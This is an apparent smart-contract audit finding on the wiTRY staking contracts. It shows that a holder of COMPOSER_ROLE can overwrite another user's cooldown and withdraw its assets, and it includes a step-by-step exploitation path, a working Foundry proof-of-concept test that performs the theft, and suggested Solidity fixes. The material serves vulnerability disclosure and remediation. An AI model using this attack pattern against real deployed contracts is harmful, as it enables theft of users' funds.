## Title
Malicious COMPOSER Can Steal User Funds by Hijacking and Draining Existing Cooldowns

## Summary
A malicious COMPOSER with `COMPOSER_ROLE` can manipulate existing user cooldowns by calling `cooldownSharesByComposer` to overwrite cooldown timestamps and accumulate assets, then call `unstakeThroughComposer` to steal all accumulated funds. The vulnerability exploits the fact that cooldown assignment has no restrictions on the target address and funds are withdrawn to the composer rather than the redeemer.

## Impact
**Severity**: High

## Finding Description
**Location:** `src/token/wiTRY/StakediTryCrosschain.sol` (lines 36-48, 77-101, 170-181)

**Intended Logic:** The `cooldownSharesByComposer` function is designed for cross-chain unstaking where the composer receives wiTRY shares from remote chains, burns them, and assigns the cooldown to the original user who initiated the unstake request. After the cooldown period, `unstakeThroughComposer` should facilitate returning the assets to that user on their origin chain. [1](#0-0) 

**Actual Logic:** The implementation has three critical flaws that enable fund theft:

1. **No validation of target address**: `cooldownSharesByComposer` accepts any `redeemer` address without verifying the redeemer authorized this action or checking for existing cooldowns. [2](#0-1) 

2. **Cooldown manipulation via overwrite and accumulation**: The `_startComposerCooldown` function OVERWRITES `cooldownEnd` (resetting the cooldown timer) while ADDING to `underlyingAmount`, allowing accumulation of assets from multiple sources. [3](#0-2) 

3. **Funds withdrawn to composer, not redeemer**: `unstakeThroughComposer` transfers all accumulated assets to `msg.sender` (the composer), not to the `receiver` parameter. [4](#0-3) 

**Exploitation Path:**

1. **Victim initiates normal cooldown**: Alice (legitimate user) calls `cooldownShares(1000 ether)` on the vault, burning 1000 ether worth of shares and creating a cooldown entry: `cooldowns[Alice] = {cooldownEnd: T0 + 90 days, underlyingAmount: 1000 ether}`. [5](#0-4) 

2. **Malicious composer hijacks cooldown**: Bob (malicious COMPOSER) calls `cooldownSharesByComposer(1 wei worth of shares, Alice)`. This burns only 1 wei worth of Bob's shares but:
   - Overwrites `cooldowns[Alice].cooldownEnd` to a NEW timestamp (current time + 90 days), extending Alice's wait
   - Adds ~1 wei to `cooldowns[Alice].underlyingAmount` (now 1000 ether + 1 wei) [6](#0-5) 

3. **Cooldown period elapses**: After the NEW cooldown period completes (90 days from Bob's call), `cooldowns[Alice].cooldownEnd` is reached. Alice may not even realize her cooldown was extended.

4. **Composer steals funds**: Bob calls `unstakeThroughComposer(Alice)` which:
   - Reads `cooldowns[Alice].underlyingAmount = 1000 ether + 1 wei`
   - Validates cooldown completion
   - Calls `silo.withdraw(msg.sender, 1000 ether + 1 wei)` - transferring ALL funds to Bob
   - Zeros out Alice's cooldown entry [7](#0-6) 

5. **Victim loses funds**: Alice attempts to call `unstake(Alice)` but finds her cooldown has been zeroed out. Her 1000 ether in iTRY assets has been stolen by Bob, who only spent 1 wei worth of shares.

**Security Property Broken:** 
- **Cooldown Integrity**: "Users must complete cooldown period before unstaking wiTRY" - violated because users lose control over their cooldowns and funds
- Enables direct theft of user funds, a High severity impact per the audit criteria

## Impact Explanation

- **Affected Assets**: All iTRY assets held in cooldown state within the iTrySilo contract. Any user who has initiated a cooldown is vulnerable to having their funds stolen.

- **Damage Severity**: A malicious COMPOSER can steal 100% of the cooldown balance from targeted victims. The attacker only needs to burn a minimal amount of their own shares (even 1 wei worth) to hijack and drain cooldowns worth arbitrary amounts. Given that cooldowns can contain substantial value (users unstaking their entire wiTRY positions), this represents catastrophic loss potential.

- **User Impact**: Every user who uses the normal cooldown mechanism (`cooldownShares` or `cooldownAssets`) on the hub chain is vulnerable. The attack can be repeated across all users with pending cooldowns. Users have no way to protect themselves - even completing their cooldown quickly doesn't help if the attacker front-runs their `unstake()` call with `unstakeThroughComposer()`.

## Likelihood Explanation

- **Attacker Profile**: Any address granted `COMPOSER_ROLE`. While this is intended to be a trusted role, the security question explicitly asks about the scenario where "the role is accidentally granted to a malicious contract or EOA". The role could be granted to:
  - A compromised contract address
  - An EOA that later turns malicious
  - An incorrectly configured automation bot
  - A third-party integration that behaves unexpectedly

- **Preconditions**: 
  - Attacker must have `COMPOSER_ROLE`
  - At least one user must have a pending cooldown (very common in normal operations)
  - Attacker must hold minimal wiTRY shares (even 1 wei) to execute the attack
  - Vault must have cooldown enabled (default state: 90 days) [8](#0-7) 

- **Execution Complexity**: Extremely simple - requires only two transactions:
  1. `cooldownSharesByComposer(minimalShares, victim)`
  2. Wait for cooldown, then `unstakeThroughComposer(victim)`
  
  No complex timing, MEV, or cross-chain coordination required. The attacker can even batch multiple victims in a single block.

- **Frequency**: Can be exploited continuously against every user with a pending cooldown. The attacker can target multiple users sequentially or simultaneously. Each successful attack can extract the full cooldown balance of a victim.

## Recommendation

Implement strict authorization checks to ensure cooldowns can only be assigned to addresses that have explicitly authorized the composer to act on their behalf:

```solidity
// In src/token/wiTRY/StakediTryCrosschain.sol:

// Add state variable to track authorized redeemers
mapping(address => mapping(address => bool)) public composerAuthorizations;

// Add authorization function for users
function authorizeComposer(address composer, bool authorized) external {
    composerAuthorizations[msg.sender][composer] = authorized;
    emit ComposerAuthorized(msg.sender, composer, authorized);
}

// Modify _startComposerCooldown to validate authorization
function _startComposerCooldown(address composer, address redeemer, uint256 shares, uint256 assets) private {
    // ADDED: Verify redeemer authorized this composer OR redeemer has no existing cooldown
    if (cooldowns[redeemer].underlyingAmount > 0) {
        require(composerAuthorizations[redeemer][composer], "Redeemer did not authorize composer");
    }
    
    uint104 cooldownEnd = uint104(block.timestamp) + cooldownDuration;

    _withdraw(composer, address(silo), composer, assets, shares);

    cooldowns[redeemer].cooldownEnd = cooldownEnd;
    cooldowns[redeemer].underlyingAmount += uint152(assets);

    emit ComposerCooldownInitiated(composer, redeemer, shares, assets, cooldownEnd);
}
```

**Alternative Mitigation**: Redesign the cooldown system to use separate mapping for composer-initiated cooldowns versus user-initiated cooldowns, preventing accumulation and manipulation:

```solidity
// Separate cooldown tracking
struct ComposerCooldown {
    address composer;
    uint104 cooldownEnd;
    uint152 underlyingAmount;
}
mapping(address => ComposerCooldown) public composerCooldowns;

// Use composerCooldowns in cooldownSharesByComposer and unstakeThroughComposer
// Keep user-initiated cooldowns in the existing cooldowns mapping
// This prevents any overlap or manipulation between the two flows
```

## Proof of Concept

```solidity
// File: test/Exploit_ComposerCooldownTheft.t.sol
// Run with: forge test --match-test test_composerStealsUserCooldown -vvv

pragma solidity 0.8.20;

import "forge-std/Test.sol";
import "../src/token/iTRY/iTry.sol";
import "../src/token/wiTRY/StakediTryCrosschain.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";

contract Exploit_ComposerCooldownTheft is Test {
    iTry public itryToken;
    StakediTryCrosschain public vault;
    
    address public owner;
    address public rewarder;
    address public treasury;
    address public alice; // Victim user
    address public bob;   // Malicious composer
    
    bytes32 public constant COMPOSER_ROLE = keccak256("COMPOSER_ROLE");
    
    function setUp() public {
        owner = makeAddr("owner");
        rewarder = makeAddr("rewarder");
        treasury = makeAddr("treasury");
        alice = makeAddr("alice");
        bob = makeAddr("bob");
        
        // Deploy iTry token with proxy
        iTry itryImplementation = new iTry();
        bytes memory initData = abi.encodeWithSelector(
            iTry.initialize.selector,
            owner,
            owner
        );
        ERC1967Proxy itryProxy = new ERC1967Proxy(address(itryImplementation), initData);
        itryToken = iTry(address(itryProxy));
        
        // Deploy StakediTryCrosschain vault
        vm.prank(owner);
        vault = new StakediTryCrosschain(
            IERC20(address(itryToken)),
            rewarder,
            owner,
            treasury
        );
        
        // Grant Bob malicious composer role (accidentally)
        vm.prank(owner);
        vault.grantRole(COMPOSER_ROLE, bob);
        
        // Mint iTRY to Alice and Bob
        vm.startPrank(owner);
        itryToken.mint(alice, 2000 ether);
        itryToken.mint(bob, 1 ether);
        vm.stopPrank();
        
        // Alice stakes her iTRY
        vm.startPrank(alice);
        itryToken.approve(address(vault), 2000 ether);
        vault.deposit(1000 ether, alice);
        vm.stopPrank();
        
        // Bob stakes minimal amount
        vm.startPrank(bob);
        itryToken.approve(address(vault), 1 ether);
        vault.deposit(1 wei, bob);
        vm.stopPrank();
    }
    
    function test_composerStealsUserCooldown() public {
        // SETUP: Alice initiates legitimate cooldown for her 1000 ether
        vm.prank(alice);
        vault.cooldownShares(vault.balanceOf(alice)); // ~1000 ether worth
        
        (uint104 aliceCooldownEnd, uint152 aliceUnderlyingAmount) = vault.cooldowns(alice);
        uint256 aliceOriginalAmount = aliceUnderlyingAmount;
        
        console.log("Alice's cooldown amount:", aliceUnderlyingAmount);
        console.log("Alice's cooldown end:", aliceCooldownEnd);
        assertEq(aliceUnderlyingAmount, 1000 ether, "Alice should have 1000 ether in cooldown");
        
        // EXPLOIT: Bob (malicious composer) hijacks Alice's cooldown with minimal shares
        vm.prank(bob);
        vault.cooldownSharesByComposer(vault.balanceOf(bob), alice); // Only 1 wei worth!
        
        (uint104 newCooldownEnd, uint152 newUnderlyingAmount) = vault.cooldowns(alice);
        
        console.log("After Bob's manipulation:");
        console.log("Alice's NEW cooldown amount:", newUnderlyingAmount);
        console.log("Alice's NEW cooldown end:", newCooldownEnd);
        
        // Verify cooldown was extended and amount accumulated
        assertGt(newCooldownEnd, aliceCooldownEnd, "Cooldown should be extended");
        assertGt(newUnderlyingAmount, aliceOriginalAmount, "Amount should be accumulated");
        
        // Fast forward past the NEW cooldown period
        vm.warp(newCooldownEnd + 1);
        
        // Record Bob's iTRY balance before theft
        uint256 bobBalanceBefore = itryToken.balanceOf(bob);
        
        // THEFT: Bob calls unstakeThroughComposer to steal ALL of Alice's cooldown
        vm.prank(bob);
        uint256 stolenAmount = vault.unstakeThroughComposer(alice);
        
        uint256 bobBalanceAfter = itryToken.balanceOf(bob);
        
        console.log("Bob stole:", stolenAmount);
        console.log("Bob's gain:", bobBalanceAfter - bobBalanceBefore);
        
        // VERIFY: Bob received Alice's full cooldown amount
        assertEq(stolenAmount, newUnderlyingAmount, "Bob should receive all accumulated assets");
        assertGt(bobBalanceAfter - bobBalanceBefore, 999 ether, "Bob stole nearly 1000 ether");
        
        // Verify Alice's cooldown was zeroed out
        (, uint152 finalUnderlyingAmount) = vault.cooldowns(alice);
        assertEq(finalUnderlyingAmount, 0, "Alice's cooldown should be zeroed");
        
        // Alice cannot claim her funds anymore
        vm.prank(alice);
        vm.expectRevert(); // Will revert because cooldown is 0
        vault.unstake(alice);
        
        console.log("Vulnerability confirmed: Bob stole", stolenAmount / 1e18, "iTRY from Alice");
        console.log("Bob only spent: 1 wei worth of shares");
    }
}
```

**Notes**

This vulnerability demonstrates a critical flaw in the composer authorization model. While the `COMPOSER_ROLE` is intended to be trusted, the security question explicitly asks about scenarios where this role is accidentally granted to malicious actors. The combination of unrestricted cooldown assignment, timestamp overwriting, and funds being sent to the composer rather than the intended recipient creates a perfect storm for fund theft.

The vulnerability is particularly severe because:
1. **Minimal cost**: Attacker only needs 1 wei worth of shares to steal arbitrary amounts
2. **Griefing + theft**: Extends victim's cooldown period AND steals their funds  
3. **No user protection**: Victims cannot prevent or detect the attack until too late
4. **Wide attack surface**: Every user with a pending cooldown is vulnerable
5. **Front-running risk**: Even if user tries to complete cooldown quickly, composer can front-run with `unstakeThroughComposer`

The intended cross-chain flow assumes the composer is trustworthy and only creates cooldowns for users who sent them wiTRY shares from remote chains. However, nothing in the code enforces this assumption, making it trivial for a malicious composer to abuse the system.

### Citations

**File:** src/token/wiTRY/StakediTryCrosschain.sol (L10-15)
```text
 * @title StakediTryCrosschain
 * @notice Extends StakediTryFastRedeem with role-gated helpers for trusted composers
 * @dev A composer (e.g. wiTryVaultComposer) can burn its own shares after bridging them in and
 *      assign the resulting cooldown entitlement to an end-user redeemer. This contract
 *      keeps the cooldown accounting in the redeemer slot while still relying on the base
 *      `_withdraw` routine to maintain iTRY system integrity.
```

**File:** src/token/wiTRY/StakediTryCrosschain.sol (L36-48)
```text
    function cooldownSharesByComposer(uint256 shares, address redeemer)
        external
        onlyRole(COMPOSER_ROLE)
        ensureCooldownOn
        returns (uint256 assets)
    {
        address composer = msg.sender;
        if (redeemer == address(0)) revert InvalidZeroAddress();
        if (shares > maxRedeem(composer)) revert ExcessiveRedeemAmount();

        assets = previewRedeem(shares);
        _startComposerCooldown(composer, redeemer, shares, assets);
    }
```

**File:** src/token/wiTRY/StakediTryCrosschain.sol (L77-101)
```text
    function unstakeThroughComposer(address receiver)
        external
        onlyRole(COMPOSER_ROLE)
        nonReentrant
        returns (uint256 assets)
    {
        // Validate valid receiver
        if (receiver == address(0)) revert InvalidZeroAddress();

        UserCooldown storage userCooldown = cooldowns[receiver];
        assets = userCooldown.underlyingAmount;

        if (block.timestamp >= userCooldown.cooldownEnd) {
            userCooldown.cooldownEnd = 0;
            userCooldown.underlyingAmount = 0;

            silo.withdraw(msg.sender, assets); // transfer to wiTryVaultComposer for crosschain transfer
        } else {
            revert InvalidCooldown();
        }

        emit UnstakeThroughComposer(msg.sender, receiver, assets);

        return assets;
    }
```

**File:** src/token/wiTRY/StakediTryCrosschain.sol (L170-181)
```text
    function _startComposerCooldown(address composer, address redeemer, uint256 shares, uint256 assets) private {
        uint104 cooldownEnd = uint104(block.timestamp) + cooldownDuration;

        // Interaction: External call to base contract (protected by nonReentrant modifier)
        _withdraw(composer, address(silo), composer, assets, shares);

        // Effects: State changes after external call (following CEI pattern)
        cooldowns[redeemer].cooldownEnd = cooldownEnd;
        cooldowns[redeemer].underlyingAmount += uint152(assets);

        emit ComposerCooldownInitiated(composer, redeemer, shares, assets, cooldownEnd);
    }
```

**File:** src/token/wiTRY/StakediTryCooldown.sol (L44-47)
```text
    constructor(IERC20 _asset, address initialRewarder, address _owner) StakediTry(_asset, initialRewarder, _owner) {
        silo = new iTrySilo(address(this), address(_asset));
        cooldownDuration = MAX_COOLDOWN_DURATION;
    }
```

**File:** src/token/wiTRY/StakediTryCooldown.sol (L109-118)
```text
    function cooldownShares(uint256 shares) external ensureCooldownOn returns (uint256 assets) {
        if (shares > maxRedeem(msg.sender)) revert ExcessiveRedeemAmount();

        assets = previewRedeem(shares);

        cooldowns[msg.sender].cooldownEnd = uint104(block.timestamp) + cooldownDuration;
        cooldowns[msg.sender].underlyingAmount += uint152(assets);

        _withdraw(msg.sender, address(silo), msg.sender, assets, shares);
    }
```
